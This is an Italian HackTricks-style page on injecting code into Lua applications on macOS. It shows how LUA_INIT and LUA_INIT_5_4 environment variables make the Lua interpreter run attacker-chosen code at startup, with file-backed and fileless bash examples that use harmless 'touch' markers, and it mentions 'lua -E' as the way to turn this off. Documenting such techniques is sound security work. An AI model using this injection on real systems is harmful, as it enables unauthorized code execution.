# Iniezione di applicazioni Lua su macOS

{{#include ../../../banners/hacktricks-training.md}}

## `LUA_INIT`

Prima di elaborare le opzioni della riga di comando o lo script di destinazione, l'interprete Lua standalone esegue `LUA_INIT_<major>_<minor>` oppure, se la variabile con versione non è presente, `LUA_INIT`. Un valore che inizia con `@` indica un file; qualsiasi altro valore viene valutato direttamente come codice Lua. Ciò consente l'esecuzione all'avvio sia basata su file sia fileless.<sup>[[1]](#references)</sup>
```bash
# File-backed
echo 'os.execute("touch /tmp/lua-init-executed")' >/tmp/lua-init.lua
LUA_INIT_5_4=@/tmp/lua-init.lua lua victim.lua

# Fileless
LUA_INIT='os.execute("touch /tmp/lua-inline-executed")' lua victim.lua
```
Il nome esatto con versione cambia a seconda dell'interprete, ad esempio `LUA_INIT_5_4`. `lua -E` ignora tutte le variabili d'ambiente, incluso il codice di avvio e i percorsi dei moduli Lua.

## References

- [1] [Interprete autonomo Lua 5.4](https://www.lua.org/manual/5.4/manual.html#7)
{{#include ../../../banners/hacktricks-training.md}}
